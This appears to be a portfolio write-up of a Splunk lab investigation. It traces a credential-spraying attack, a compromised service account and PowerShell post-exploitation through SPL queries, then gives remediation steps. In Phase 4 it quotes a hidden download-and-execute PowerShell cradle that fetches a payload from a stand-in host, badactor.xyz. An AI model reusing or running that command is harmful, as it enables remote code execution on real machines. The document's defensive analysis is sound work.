# Cloud SIEM Triage: Incident Response and Threat Hunting in Splunk

# Executive Summary

This project demonstrates an end-to-end incident response investigation using Splunk Cloud to parse, analyze, and triage a multi-stage corporate network intrusion. Acting as a Security Operations Center (SOC) Analyst, I ingested raw Windows endpoint security events, mapped an active adversary timeline, isolated a perimeter breach, and deobfuscated a post-exploitation Command and Control (C2) PowerShell payload.

# Core Competencies

SIEM Data Ingestion: Parsing structured JSON logging, configuring data source overrides, and optimizing time-series parameters.
Threat Hunting and Analytics: Writing operational Search Processing Language (SPL) queries to aggregate anomalies and track lateral movement indicators.
Incident Framework Mapping: Correlating technical telemetry to real-world adversary tactics using the MITRE ATT&CK framework.

---

# Environment and Tools Architecture

SIEM Platform: Splunk Cloud Platform (v10.4) Interactive Sandbox
Telemetry Source: Windows Security Event Log (Security.evtx formatted as JSON structural arrays)
Endpoint Host Identity: WIN-SERVER-2026
Development Environment: Visual Studio Code Workspace Isolation

---

# Phase-by-Phase Investigation Narrative

# Phase 1: Telemetry Ingestion and Data Validation

The investigation began by onboarding the target dataset (attack_logs.json) into the live Splunk Cloud environment. Source-type rules were managed to resolve timestamp extraction constraints, aligning standard ISO 8601 formatting to the system event index timeline under host asset WIN-SERVER-2026.

# Baseline Telemetry Verification:

Figure 1: Verification of raw telemetry ingestion within the Splunk core log viewer window.

# Phase 2: Detecting the Perimeter Attack (Credential Spraying)

To uncover initial perimeter anomalies, an aggregation query was executed targeting Windows Security Failure audits (EventCode 4625). By piping the raw indicators into a statistics engine, I isolated a malicious volume signature matching an active Brute-Force/Credential Spraying campaign (MITRE ATT&CK T1110).

# SPL Analysis Query:

```spl
source="attack_logs.json" EventCode=4625 | stats count by IpAddress, TargetUserName

```

# Incident Metrics Table:

Figure 2: Statistical breakdown isolating an external attacker IP targeting multiple corporate identities.

Analysis Evaluation: External adversary IP 192.168.10.45 was observed cycling automated authentication attempts sequentially across common administrative and employee user profiles (jdoe, admin, service_account).

# Phase 3: Pinpointing the Compromise Vector

With an active credential spray campaign confirmed, the investigation shifted to transactional tracking. A targeted search was executed to check for successful authentications generated by the malicious external IP asset to pinpoint if the perimeter defense failed.

# SPL Analysis Query:

```spl
source="attack_logs.json" EventCode=4624 IpAddress="192.168.10.45" | table _time, TargetUserName, LogonType

```

# Operational Detection Table:

Figure 3: Transaction verification identifying the exact compromised account profile.

Analysis Evaluation: The perimeter was breached at exactly 2026-05-31 22:16:22. The threat actor successfully cracked the authentication credentials for the corporate service_account via a Logon Type 3 (Network connection), marking the Initial Access milestone (MITRE ATT&CK TA0001).

# Phase 4: Post-Exploitation Forensics and C2 Deobfuscation

Following network entry, the adversary immediately attempted to establish runtime control. An audit of Windows PowerShell Script Block Logging (EventCode 4104) was conducted to unpack the structural code strings executed by the compromised container context.

# SPL Analysis Query:

```spl
source="attack_logs.json" EventCode=4104 | table _time, User, ScriptBlockText

```

# Forensic Output Table:

Figure 4: Deobfuscation of deep-level PowerShell script block logs executing with SYSTEM privileges.

# Technical Malicious Code Breakdown:

The query isolated a critical system-level execution artifact running under elevated privileges (User=SYSTEM):

```powershell
powershell.exe -nop -w hidden -c $i=new-object net.webclient; ... IEX $i.downloadstring('http://badactor.xyz/payload.ps1');

```

Bypass Execution Flags: The attacker invoked -nop (NoProfile) to prevent local environment script checks from firing, paired with -w hidden to suppress the console user interface entirely.
Command and Control Staging: The command dynamically declared a net.webclient network module to stream data from an unverified external hosting server (badactor.xyz).
Memory Injection: The inclusion of the IEX (Invoke-Expression) operator forced the host machine to immediately execute the downloaded file (payload.ps1) directly in system memory (MITRE ATT&CK T1059.001), bypassing traditional local file system antivirus scanners.

---

# Defensive Recommendations and Remediation Controls

Based on the forensics timeline compiled during this triage exercise, the following defensive actions are recommended for the infrastructure environment:

1. Account Isolation: Revoke active tokens and force an emergency credential rotation for the service_account. Review access control list (ACL) permissions to identify why it was allowed to run code under the SYSTEM context.
2. Network Defenses: Implement immediate firewall rules to drop incoming traffic from IP 192.168.10.45 and block outbound lookups to domain badactor.xyz.
3. Authentication Controls: Restrict non-interactive system service accounts from making remote network logins (Logon Type 3) without explicit source validation profiles.